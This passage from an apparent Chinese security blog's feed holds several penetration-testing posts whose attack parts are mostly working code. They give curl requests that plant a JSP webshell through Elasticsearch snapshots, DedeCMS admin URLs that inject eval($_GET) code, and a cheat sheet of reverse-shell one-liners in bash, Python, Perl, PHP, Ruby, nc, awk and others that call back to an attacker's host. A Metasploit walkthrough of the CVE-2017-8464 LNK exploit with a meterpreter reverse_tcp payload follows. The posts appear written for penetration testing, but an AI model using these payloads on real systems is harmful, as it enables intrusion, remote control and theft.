traceback.print_exc()</div></pre></td></tr></table></figure><h4 id="1-5ï¼ˆWooYun-2015-110216ï¼‰Elasticsearchï¼ˆ1-5-xä»¥ä¸‹ï¼‰â€“-å†™å…¥webshellæ¼æ´"><a href="#1-5ï¼ˆWooYun-2015-110216ï¼‰Elasticsearchï¼ˆ1-5-xä»¥ä¸‹ï¼‰â€“-å†™å…¥webshellæ¼æ´" class="headerlink" title="1.5ï¼ˆWooYun-2015-110216ï¼‰Elasticsearchï¼ˆ1.5.xä»¥ä¸‹ï¼‰â€“ å†™å…¥webshellæ¼æ´"></a>1.5ï¼ˆWooYun-2015-110216ï¼‰Elasticsearchï¼ˆ1.5.xä»¥ä¸‹ï¼‰â€“ å†™å…¥webshellæ¼æ´</h4><h5 id="è¯´æ˜ï¼š-1"><a href="#è¯´æ˜ï¼š-1" class="headerlink" title="è¯´æ˜ï¼š"></a>è¯´æ˜ï¼š</h5><p>1ã€åŸç†ï¼š<br>ElasticSearchå…·æœ‰å¤‡ä»½æ•°æ®çš„åŠŸèƒ½ï¼Œç”¨æˆ·å¯ä»¥ä¼ å…¥ä¸€ä¸ªè·¯å¾„ï¼Œè®©å…¶å°†æ•°æ®å¤‡ä»½åˆ°è¯¥è·¯å¾„ä¸‹ï¼Œä¸”æ–‡ä»¶åå’Œåç¼€éƒ½å¯æ§ã€‚<br>æ‰€ä»¥ï¼Œå¦‚æœåŒæ–‡ä»¶ç³»ç»Ÿä¸‹è¿˜è·‘ç€å…¶ä»–æœåŠ¡ï¼Œå¦‚Tomcatã€PHPç­‰ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ElasticSearchçš„å¤‡ä»½åŠŸèƒ½å†™å…¥ä¸€ä¸ªwebshellã€‚</p><p>2ã€åˆ©ç”¨æ–¹å¼ï¼š<br>åœ¨è·å–å…¶ä»–webæœåŠ¡çš„æ ¹ç›®å½•åï¼Œç›´æ¥ä½¿ç”¨ESå†™å…¥å¯¹åº”æœ¨é©¬æ–‡ä»¶è‡³è§£æç›®å½•å³å¯ã€‚<br>å¦‚tomcatæœåŠ¡webè§£æç›®å½•ä¸ºï¼š/usr/local/tomcat/webappsã€‚<br>é¦–å…ˆå»ºç«‹ä¸€ä¸ªæ¶æ„ç´¢å¼•æ–‡æ¡£ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">curl -XPOST http://ip:9200/yz.jsp/yz.jsp/1 -d&apos;</div><div class="line">&#123;&quot;&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]&#123;47,116,101,115,116,46,106,115,112&#125;)),new String(new byte[]&#123;114,119&#125;)).write(request.getParameter(new String(new byte[]&#123;102&#125;)).getBytes());%&gt;&quot;:&quot;test&quot;&#125;</div><div class="line">&apos;</div></pre></td></tr></table></figure></p><p>å†åˆ›å»ºä¸€ä¸ªæ¶æ„çš„å­˜å‚¨åº“ï¼Œå…¶ä¸­locationçš„å€¼å³ä¸ºæˆ‘è¦å†™å…¥çš„è·¯å¾„ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">curl -XPUT &apos;http://ip:9200/_snapshot/yz.jsp&apos; -d &apos;&#123;</div><div class="line">     &quot;type&quot;: &quot;fs&quot;,</div><div class="line">     &quot;settings&quot;: &#123;</div><div class="line">          &quot;location&quot;: &quot;/usr/local/tomcat/webapps/wwwroot&quot;,</div><div class="line">          &quot;compress&quot;: false</div><div class="line">     &#125;</div><div class="line">&#125;&apos;</div></pre></td></tr></table></figure></p><p>å­˜å‚¨åº“éªŒè¯å¹¶åˆ›å»º:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">curl -XPUT &quot;http://ip:9200/_snapshot/yz.jsp/yz.jsp&quot; -d &apos;&#123;</div><div class="line">     &quot;indices&quot;: &quot;yz.jsp&quot;,</div><div class="line">     &quot;ignore_unavailable&quot;: &quot;true&quot;,</div><div class="line">     &quot;include_global_state&quot;: false</div><div class="line">&#125;&apos;</div></pre></td></tr></table></figure></p><p>æœ€åè®¿é—®å†™å…¥çš„webshellå³å¯ï¼š</p><blockquote><p><a href="http://ip:9200/wwwroot/indices/yz.jsp/snapshot-yz.jsp" target="_blank" rel="external">http://ip:9200/wwwroot/indices/yz.jsp/snapshot-yz.jsp</a></p></blockquote><p>ä¸Šé¢çš„jspæ–‡ä»¶ä½œç”¨ä¸ºå‘wwwrootç›®å½•ä¸‹çš„test.jspæ–‡ä»¶å†™å…¥ä»»æ„å­—ç¬¦å¦‚è®¿é—®ä¸‹é¢ï¼š</p><blockquote><p><a href="http://ip:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=test" target="_blank" rel="external">http://ip:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=test</a><br>å°†test.jspä¸­å†™å…¥testã€‚åªéœ€è®¿é—®<a href="http://ip:8080/wwwroot/test.jspå³å¯çœ‹åˆ°å…¶é¡µé¢æ˜¾ç¤ºtestã€‚" target="_blank" rel="external">http://ip:8080/wwwroot/test.jspå³å¯çœ‹åˆ°å…¶é¡µé¢æ˜¾ç¤ºtestã€‚</a></p></blockquote><h5 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h5><p>(1) åŸç†åœ°å€ï¼š<a href="http://cb.drops.wiki/bugs/wooyun-2015-0110216.html" target="_blank" rel="external">http://cb.drops.wiki/bugs/wooyun-2015-0110216.html</a><br><br>(2ï¼‰dockerfileåœ°å€ï¼š<a href="https://github.com/vulhub/vulhub/tree/master/elasticsearch/WooYun-2015-110216" target="_blank" rel="external">https://github.com/vulhub/vulhub/tree/master/elasticsearch/WooYun-2015-110216</a><br></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0-å› &quot;&gt;&lt;a href=&quot;#0-å› &quot; class=&quot;headerlink&quot; title=&quot;0.å› &quot;&gt;&lt;/a&gt;0.å› &lt;/h3&gt;&lt;p&gt;ä¼—æµ‹è¿‡ç¨‹ä¸­é‡åˆ°äº†Elsaticsearchæœªæˆæƒè®¿é—®çš„æƒ…å†µï¼Œæå®Œå‘ç°åˆæŠŠæ—¶é—´æµªè´¹åœ¨äº†æŸ¥å„ç§èµ„æ–™ä¸Šï¼Œ
    
    </summary>
    
      <category term="æ¸—é€æµ‹è¯•" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="getshell" scheme="http://sunu11.com/tags/getshell/"/>
    
      <category term="Elsaticsearch" scheme="http://sunu11.com/tags/Elsaticsearch/"/>
    
  </entry>
  
  <entry>
    <title>å¿ƒæ‚¸</title>
    <link href="http://sunu11.com/2018/05/21/%E5%BF%83%E6%82%B8/"/>
    <id>http://sunu11.com/2018/05/21/å¿ƒæ‚¸/</id>
    <published>2018-05-21T15:53:53.000Z</published>
    <updated>2018-08-23T06:23:16.363Z</updated>
    
    <content type="html"><![CDATA[<p>æ­¤æ–‡æ°¸åœ¨å¿ƒä¸­</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æ­¤æ–‡æ°¸åœ¨å¿ƒä¸­&lt;/p&gt;

      
    
    </summary>
    
      <category term="å²æœˆ" scheme="http://sunu11.com/categories/%E5%B2%81%E6%9C%88/"/>
    
    
      <category term="ç”Ÿæ´»" scheme="http://sunu11.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>DedeCMS V5.7 SP2åå°æ¼æ´å°é›†åˆ</title>
    <link href="http://sunu11.com/2018/04/03/19/"/>
    <id>http://sunu11.com/2018/04/03/19/</id>
    <published>2018-04-03T06:20:22.000Z</published>
    <updated>2018-11-10T12:10:01.557Z</updated>
    
    <content type="html"><![CDATA[<h3 id="è®°å½•ä¸€ä¸‹æœ€æ–°ç‰ˆdedecmsåå°æ‹¿æœåŠ¡å™¨çš„å‡ ä¸ªæ–¹å¼ã€‚"><a href="#è®°å½•ä¸€ä¸‹æœ€æ–°ç‰ˆdedecmsåå°æ‹¿æœåŠ¡å™¨çš„å‡ ä¸ªæ–¹å¼ã€‚" class="headerlink" title="è®°å½•ä¸€ä¸‹æœ€æ–°ç‰ˆdedecmsåå°æ‹¿æœåŠ¡å™¨çš„å‡ ä¸ªæ–¹å¼ã€‚"></a>è®°å½•ä¸€ä¸‹æœ€æ–°ç‰ˆdedecmsåå°æ‹¿æœåŠ¡å™¨çš„å‡ ä¸ªæ–¹å¼ã€‚</h3><p><strong>01ã€ä¸Šä¼ shell</strong></p><p>1ã€åå°ä¸Šä¼ flashæ–‡ä»¶å¤„æœªå¯¹æ–‡ä»¶å†…å®¹ä½œæ ¡éªŒï¼Œå¯ç›´æ¥ä¸Šä¼ shellã€‚<br>2ã€é€šè¿‡é‡å‘½ååŠŸèƒ½ï¼š<a id="more"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/dede/file_manage_control.php?fmdo=rename&amp;oldfilename=/uploads/media/xxx/xxxx.swf&amp;newfilename=/sunu11.php</div></pre></td></tr></table></figure><p><strong>02ã€å†™å…¥é…ç½®</strong><br>/dede/sys_verifies.phpä¸­å¯å†™è¿›æ¶æ„ä»£ç è‡³incæ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1ã€http://localhost/dedecms/uploads/dede/sys_verifies.php?action=getfiles&amp;refiles[0]=123&amp;refiles[1]=\%22;eval($_GET[a]);die();//</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">2ã€http://localhost/dedecms/uploads/dede/sys_verifies.php?action=down&amp;a=phpinfo();</div></pre></td></tr></table></figure><p><strong>03ã€æ•°æ®åº“å†™å…¥æ•°æ®æœªè¿‡æ»¤ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/dedecms/uploads/dede/stepselect_main.php?action=addenum_save&amp;ename=xxx&amp;egroup=;phpinfo();$&amp;issign=1</div></pre></td></tr></table></figure><p>æŸ¥è¯¢ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://localhost/dedecms/uploads/dede/sys_cache_up.php?step=2&amp;egroup=a=1;phpinfo();&amp;dopost=ok</div><div class="line">or:</div><div class="line">http://localhost/data/enums/;phpinfo();$.php</div></pre></td></tr></table></figure><p><strong>05ã€æ¨¡æ¿é—®é¢˜ï¼š</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/dede/tag_test_action.php?url=a&amp;token=xxxxx&amp;partcode=&#123;dede:mochazz name=&apos;source&apos; runphp=&apos;yes&apos;&#125;phpinfo();&#123;/dede:mochazz&#125;</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;è®°å½•ä¸€ä¸‹æœ€æ–°ç‰ˆdedecmsåå°æ‹¿æœåŠ¡å™¨çš„å‡ ä¸ªæ–¹å¼ã€‚&quot;&gt;&lt;a href=&quot;#è®°å½•ä¸€ä¸‹æœ€æ–°ç‰ˆdedecmsåå°æ‹¿æœåŠ¡å™¨çš„å‡ ä¸ªæ–¹å¼ã€‚&quot; class=&quot;headerlink&quot; title=&quot;è®°å½•ä¸€ä¸‹æœ€æ–°ç‰ˆdedecmsåå°æ‹¿æœåŠ¡å™¨çš„å‡ ä¸ªæ–¹å¼ã€‚&quot;&gt;&lt;/a&gt;è®°å½•ä¸€ä¸‹æœ€æ–°ç‰ˆdedecmsåå°æ‹¿æœåŠ¡å™¨çš„å‡ ä¸ªæ–¹å¼ã€‚&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;01ã€ä¸Šä¼ shell&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1ã€åå°ä¸Šä¼ flashæ–‡ä»¶å¤„æœªå¯¹æ–‡ä»¶å†…å®¹ä½œæ ¡éªŒï¼Œå¯ç›´æ¥ä¸Šä¼ shellã€‚&lt;br&gt;2ã€é€šè¿‡é‡å‘½ååŠŸèƒ½ï¼š
    
    </summary>
    
      <category term="WEBå®‰å…¨" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Dedecms" scheme="http://sunu11.com/tags/Dedecms/"/>
    
      <category term="getshell" scheme="http://sunu11.com/tags/getshell/"/>
    
  </entry>
  
  <entry>
    <title>å†…ç½‘æ¸—é€ä¹‹åå¼¹shellçš„å‡ ç§å§¿åŠ¿</title>
    <link href="http://sunu11.com/2018/01/26/18/"/>
    <id>http://sunu11.com/2018/01/26/18/</id>
    <published>2018-01-26T04:19:50.000Z</published>
    <updated>2018-11-03T11:58:16.005Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ä¸»è¦åå¼¹æ–¹å¼"><a href="#ä¸»è¦åå¼¹æ–¹å¼" class="headerlink" title="ä¸»è¦åå¼¹æ–¹å¼"></a>ä¸»è¦åå¼¹æ–¹å¼</h3><blockquote><p>é¦–å…ˆvpsç›‘å¬ï¼š<code>nc â€“l â€“vv â€“p port</code><a id="more"></a></p></blockquote><p><strong>1.bashåå¼¹</strong><br>åˆ©ç”¨ç³»ç»Ÿç‰¹æ®Šè®¾å¤‡æ–‡ä»¶/dev/tcpå»ºç«‹socketå‘å‡ºå»ï¼Œè¾¾åˆ°åå¼¹shellçš„æ•ˆæœ<br><code>bash -i&gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></p><p><strong>2.telnetåå¼¹</strong><br>é€‚ç”¨äºncä¸å¯ç”¨æˆ–è€…/dev/tcpä¸å¯ç”¨æ¡ä»¶ä¸‹ï¼Œå…¶ä¸­mknodæ˜¯åˆ›å»ºè®¾å¤‡æ–‡ä»¶<br><code>mknod test p &amp;&amp; telnet ip port 0&lt;test | /bin/bash 1&gt;test</code></p><p><strong>3.Java</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">r = Runtime.getRuntime()</div><div class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</div><div class="line">p.waitFor()</div></pre></td></tr></table></figure></p><p><strong>4.Ruby</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e&apos;f=TCPSocket.open(&quot;ip&quot;,port).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</div></pre></td></tr></table></figure></p><p>ä¸ä¾èµ–äº/bin/shçš„shellï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;ip&quot;,&quot;port&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</div></pre></td></tr></table></figure></p><p><strong>5.PHP</strong><br><code>php -r &#39;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p><p><strong>6.Python(2.7)</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</div></pre></td></tr></table></figure></p><p>å¦å¤–çš„å½¢å¼ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c &quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&apos;ip&apos;,port))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</div></pre></td></tr></table></figure></p><p><strong>7.Perl</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;use Socket;$i=&quot;ip&quot;;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</div></pre></td></tr></table></figure></p><p>ä¸ä¾èµ–äº/bin/shçš„shellï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -MIO -e &apos;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;</div></pre></td></tr></table></figure></p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/18.2.jpg" alt="18-1"></p><p><strong>8.nc</strong><br>linuxï¼š<code>nc -e /bin/sh ip port</code><br>Windowsï¼š<code>nc -e cmd.exe ip port</code><br>å½“ä¸èƒ½ä½¿ç”¨-eå‚æ•°æ—¶ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mknod backpipe p &amp;&amp; nc ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe</div><div class="line">/bin/sh | nc ip port</div><div class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc ip port 0/tmp/</div></pre></td></tr></table></figure></p><p>ncç‰ˆæœ¬æœ‰é—®é¢˜æ—¶ï¼š<br><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f</code></p><p><strong>9.lua</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;ip&apos;,&apos;port&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</div></pre></td></tr></table></figure></p><p><strong>10.gawk</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/gawk -f</div><div class="line"></div><div class="line">BEGIN &#123;</div><div class="line">        Port    =       8080</div><div class="line">        Prompt  =       &quot;bkd&gt; &quot;</div><div class="line"></div><div class="line">        Service = &quot;/inet/tcp/&quot; Port &quot;/0/0&quot;</div><div class="line">        while (1) &#123;</div><div class="line">                do &#123;</div><div class="line">                        printf Prompt |&amp; Service</div><div class="line">                        Service |&amp; getline cmd</div><div class="line">                        if (cmd) &#123;</div><div class="line">                                while ((cmd |&amp; getline) &gt; 0)</div><div class="line">                                        print $0 |&amp; Service</div><div class="line">                                close(cmd)</div><div class="line">                        &#125;</div><div class="line">                &#125; while (cmd != &quot;exit&quot;)</div><div class="line">                close(Service)</div><div class="line">        &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>11ã€awk</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">awk &apos;BEGIN&#123;s=&quot;/inet/tcp/0/192.168.1.128/8080&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&apos;</div></pre></td></tr></table></figure></p><p>å‚è€ƒé“¾æ¥ï¼š<br><a href="http://www.freebuf.com/articles/system/147768.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/147768.html</a><br><a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" target="_blank" rel="external">https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;ä¸»è¦åå¼¹æ–¹å¼&quot;&gt;&lt;a href=&quot;#ä¸»è¦åå¼¹æ–¹å¼&quot; class=&quot;headerlink&quot; title=&quot;ä¸»è¦åå¼¹æ–¹å¼&quot;&gt;&lt;/a&gt;ä¸»è¦åå¼¹æ–¹å¼&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;é¦–å…ˆvpsç›‘å¬ï¼š&lt;code&gt;nc â€“l â€“vv â€“p port&lt;/code&gt;
    
    </summary>
    
      <category term="æ¸—é€æµ‹è¯•" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="nc" scheme="http://sunu11.com/tags/nc/"/>
    
      <category term="å†…ç½‘æ¸—é€" scheme="http://sunu11.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>LNKæ–‡ä»¶ï¼ˆå¿«æ·æ–¹å¼ï¼‰è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆå¤ç°ï¼‰</title>
    <link href="http://sunu11.com/2017/08/29/17/"/>
    <id>http://sunu11.com/2017/08/29/17/</id>
    <published>2017-08-29T12:26:59.000Z</published>
    <updated>2018-11-03T11:57:59.917Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>åç§°ï¼šCVE-2017-8464 LNKæ–‡ä»¶ï¼ˆå¿«æ·æ–¹å¼ï¼‰è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</p><p>æ¦‚è¦ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡å¯ç§»åŠ¨é©±åŠ¨å™¨ï¼ˆUç›˜ï¼‰æˆ–è¿œç¨‹å…±äº«ç­‰æ–¹å¼å°†åŒ…å«æ¶æ„LNKæ–‡ä»¶å’Œä¸ä¹‹ç›¸å…³<a id="more"></a>çš„æ¶æ„äºŒè¿›åˆ¶æ–‡ä»¶ä¼ æ’­ç»™ç”¨æˆ·ã€‚å½“ç”¨æˆ·é€šè¿‡Windowsèµ„æºç®¡ç†å™¨æˆ–ä»»ä½•èƒ½å¤Ÿè§£æLNKæ–‡ä»¶çš„ç¨‹åºæ‰“å¼€æ¶æ„çš„LNKæ–‡ä»¶æ—¶ï¼Œä¸ä¹‹å…³è”çš„æ¶æ„äºŒè¿›åˆ¶ä»£ç å°†åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œã€‚</p><h3 id="å¤ç°ï¼š"><a href="#å¤ç°ï¼š" class="headerlink" title="å¤ç°ï¼š"></a>å¤ç°ï¼š</h3><p>æ”»å‡»æœºkaliï¼š192.168.86.180</p><p>é¶æœºwin10ï¼ˆ64ä½ï¼‰ï¼š192.168.86.177</p><p>é¦–å…ˆkaliä¸‹è½½expï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd /opt</div><div class="line">Wget   https://raw.githubusercontent.com/ykoster/metasploit-framework/169e00bf3442447324df064192db62cdc5b5b860/modules/exploits/windows/fileformat/cve_2017_8464_lnk_rce.rb</div></pre></td></tr></table></figure></p><p>  copy expåˆ°/usr/share/metasploit-framework/modules/exploit/windows/smb/ç›®å½•ä¸‹<br><code>cp  cve_2017_8464_lnk_rce.rb  /usr/share/metasploit-framework/modules/exploits/windows/smb/</code></p><p>ç”Ÿæˆç›‘å¬shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler   ä½¿ç”¨exploit/multi/handlerç›‘å¬è¿å…¥çš„backdoor</div><div class="line">msf exploit(handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp è®¾ç½®å¯¹åº”çš„payload</div><div class="line">msf exploit(handler) &gt; set LHOST 192.168.86.180</div><div class="line">msf exploit(handler) &gt; exploit -j</div></pre></td></tr></table></figure><p>ç”Ÿæˆ.LNKæ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">use exploit/windows/smb/cve_2017_8464_lnk_rce</div><div class="line">msf exploit(cve_2017_8464_lnk_rce) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp</div><div class="line">msf exploit(cve_2017_8464_lnk_rce) &gt; set LHOST 192.168.86.180</div><div class="line">msf exploit(cve_2017_8464_lnk_rce) &gt; exploit</div></pre></td></tr></table></figure><p>å°†ç”Ÿæˆçš„dllæ–‡ä»¶å’Œä»¥Uç›˜ç›˜ç¬¦ç»“å°¾çš„.LNKæ–‡ä»¶å¤åˆ¶åˆ°Uç›˜ä¸­ï¼›å½“æ’å…¥Uç›˜è‡³ä¸»æœºï¼Œåœ¨é¶æœºä¸ŠåŒå‡».LNKæ–‡ä»¶ï¼Œå³å¯è§¦å‘dllæ–‡ä»¶å»ºç«‹è¿æ¥ã€‚</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-21.png" alt="q-1"><br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-22.png" alt="q-2"></p><h3 id="å½±å“ç‰ˆæœ¬ï¼š"><a href="#å½±å“ç‰ˆæœ¬ï¼š" class="headerlink" title="å½±å“ç‰ˆæœ¬ï¼š"></a>å½±å“ç‰ˆæœ¬ï¼š</h3><p>æ¡Œé¢ç³»ç»Ÿï¼šWindows 10, 7, 8.1, 8, Vistaå’ŒWindows RT 8.1<br>æœåŠ¡å™¨ç³»ç»Ÿï¼šWindows Server 2016ï¼Œ2012ï¼Œ2008</p><h3 id="ä¿®å¤ï¼š"><a href="#ä¿®å¤ï¼š" class="headerlink" title="ä¿®å¤ï¼š"></a>ä¿®å¤ï¼š</h3><p>æ¡Œé¢ç³»ç»ŸWindows 10,7,8.1å’ŒWindows RT 8.1ï¼›æœåŠ¡å™¨ç³»ç»Ÿï¼šWindows Server 2016ï¼Œ2012ï¼Œ2008ï¼Œå¯ä»¥é€šè¿‡Windows Updateè‡ªåŠ¨æ›´æ–°å¾®è½¯è¡¥ä¸çš„æ–¹å¼è¿›è¡Œä¿®å¤ã€‚<br>Windows 8, Vistaå¯ä»¥é€šè¿‡é€‰æ‹©å¯¹åº”ç‰ˆæœ¬ç„¶åæ‰‹åŠ¨æ›´æ–°è¡¥ä¸çš„æ–¹å¼è¿›è¡Œæ›´æ–°<br>ï¼ˆè¡¥ä¸ä¸‹è½½åœ°å€å‚è€ƒï¼‰<a href="https://support.microsoft.com/zh-cn/help/4025687/microsoft-security-advisory-4025685-guidance-for-older-platforms" target="_blank" rel="external">https://support.microsoft.com/zh-cn/help/4025687/microsoft-security-advisory-4025685-guidance-for-older-platforms</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;ä»‹ç»&quot;&gt;&lt;a href=&quot;#ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;ä»‹ç»&quot;&gt;&lt;/a&gt;ä»‹ç»&lt;/h3&gt;&lt;p&gt;åç§°ï¼šCVE-2017-8464 LNKæ–‡ä»¶ï¼ˆå¿«æ·æ–¹å¼ï¼‰è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´&lt;/p&gt;
&lt;p&gt;æ¦‚è¦ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡å¯ç§»åŠ¨é©±åŠ¨å™¨ï¼ˆUç›˜ï¼‰æˆ–è¿œç¨‹å…±äº«ç­‰æ–¹å¼å°†åŒ…å«æ¶æ„LNKæ–‡ä»¶å’Œä¸ä¹‹ç›¸å…³
    
    </summary>
    
      <category term="æ¸—é€æµ‹è¯•" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="CVE-2017-8464" scheme="http://sunu11.com/tags/CVE-2017-8464/"/>
    
  </entry>
  
  <entry>
    <title>msfvenomç”Ÿæˆpayloadçš„æ–¹æ³•</title>
    <link href="http://sunu11.com/2017/08/29/16/"/>
    <id>http://sunu11.com/2017/08/29/16/</id>
